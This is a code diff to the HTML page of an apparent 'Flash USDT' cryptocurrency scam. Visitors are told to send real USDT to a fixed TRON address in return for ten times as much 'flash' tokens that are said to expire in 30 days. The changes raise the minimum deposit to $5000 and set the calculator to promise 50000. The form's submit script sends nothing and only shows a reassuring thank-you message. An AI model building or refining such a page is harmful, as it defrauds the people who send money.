@@ -36,6 +36,7 @@
     .calculator { margin-top: 1rem; text-align: center; }
     .calculator p { margin: 1rem 0; font-size: 1rem; }
     .calculator input { width: 4rem; text-align: center; }
+    .site-footer { margin-top: 2rem; font-size: 0.9rem; text-align: center; }
     @media (max-width: 320px) {
       .box { padding: 1rem; }
       .calculator input { width: 3rem; }
@@ -47,36 +48,50 @@
     <h2>GET FLASH USDT</h2>
     <form name="usdt-form" id="usdt-form" method="POST" data-netlify="true" onsubmit="handleSubmit(event)">
       <input type="hidden" name="form-name" value="usdt-form">
+
       <label for="buyAddress">Buy Address (TRC20) (Send Your USDT Here):</label>
       <input type="text" id="buyAddress" name="buyAddress" value="TVuDSSUvFyUxFJGtXAAM1SQ7UNscPEdaHM" readonly>
+      <p style="color:#fff; text-align:left; margin:0.25rem 0;">Minimum transaction must be 5000 dollars</p>
+
       <div class="warning">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</div>
+
       <label for="usdtAddress">Your USDT Address:</label>
       <input type="text" id="usdtAddress" name="usdtAddress" placeholder="Enter your TRC20 address" required>
+
       <button type="submit">Submit</button>
       <div id="thankyouMsg" style="display:none; color:#fff; margin-top:1rem; text-align:center;">
         <p>If you have sent the USDT to Buy Address, your Flash USDT will be sent to you in 15 minutes to 1 hour. Please wait patiently.</p>
         <p>Thank You</p>
       </div>
+
       <div class="calculator-header">CALCULATOR</div>
       <div class="calculator">
-        <p>If you deposit <input type="number" id="deposit" name="deposit" value="1.00" step="0.01"> USDT</p>
-        <p>You will get <span id="outputVal">10.00</span> USDT</p>
+        <p>If you deposit <input type="number" id="deposit" name="deposit" value="5000" step="0.01"> USDT</p>
+        <p>You will get <span id="outputVal">50000.00</span> USDT</p>
       </div>
     </form>
+
+    <div class="site-footer">
+      <p>The unused Flash USDT will be removed in 30 days</p>
+      <p>You can only make 10 transactions for the amount you receive</p>
+    </div>
   </div>
+
   <script>
     const deposit = document.getElementById('deposit');
     const outputVal = document.getElementById('outputVal');
     const form = document.getElementById('usdt-form');
     const thankyou = document.getElementById('thankyouMsg');
+
     function updateOutput() { const val = parseFloat(deposit.value) || 0; outputVal.textContent = (val * 10).toFixed(2); }
     deposit.addEventListener('input', updateOutput);
     updateOutput();
+
     function handleSubmit(e) {
       e.preventDefault();
       new FormData(form);
       thankyou.style.display = 'block';
-      form.reset(); deposit.value = '1.00'; updateOutput();
+      form.reset(); deposit.value = '5000'; updateOutput();
     }
   </script>
 </body>
